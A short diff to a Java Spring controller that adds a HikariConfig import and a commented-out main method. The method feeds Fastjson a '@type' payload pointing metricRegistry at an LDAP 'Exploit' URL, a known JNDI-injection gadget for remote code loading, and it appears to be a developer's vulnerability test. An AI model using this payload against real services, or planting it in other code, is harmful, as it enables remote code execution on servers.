@@ -18,6 +18,7 @@ import org.slf4j.Logger;
 import org.slf4j.LoggerFactory;
 import org.springframework.web.bind.annotation.*;
 import org.springframework.web.multipart.MultipartFile;
+import com.zaxxer.hikari.HikariConfig;
 
 import javax.annotation.Resource;
 import javax.servlet.http.HttpServletRequest;
@@ -468,4 +469,9 @@ public class MaterialController {
         }
         return arr;
     }
+
+//    public static void main(String[] args) {
+//        String search = "{\"@type\":\"com.zaxxer.hikari.HikariConfig\",\"metricRegistry\":\"ldap://127.0.0.1:1389/Exploit\"}";
+//        JSON.parseObject(search);
+//    }
 }
